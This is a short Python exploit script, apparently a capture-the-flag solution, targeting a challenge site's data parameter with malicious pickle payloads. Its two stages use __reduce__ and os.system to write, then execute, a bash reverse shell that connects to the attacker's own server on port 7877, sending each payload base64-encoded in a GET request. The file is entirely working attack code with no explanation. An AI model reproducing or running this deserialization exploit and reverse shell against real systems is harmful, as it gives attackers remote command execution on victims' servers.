import base64
import requests
import pickle

import os

url = "https://snake.ais3.org/?data="

class Test(object):
    def __reduce__(self):
        return (os.system,('''echo "bash -c 'bash -i >& /dev/tcp/我的伺服器ip/7877 0>&1'" > /tmp/878''',))


r = pickle.dumps(Test(), protocol=0)
c = base64.b64encode(r)
payload = str(c)[2:-1]

url1 = url + payload

res = requests.get(url1)


class Test(object):
    def __reduce__(self):
        return (os.system,('''bash /tmp/878''',))

r = pickle.dumps(Test(), protocol=0)
c = base64.b64encode(r)
payload = str(c)[2:-1]

url1 = url + payload

res = requests.get(url1)

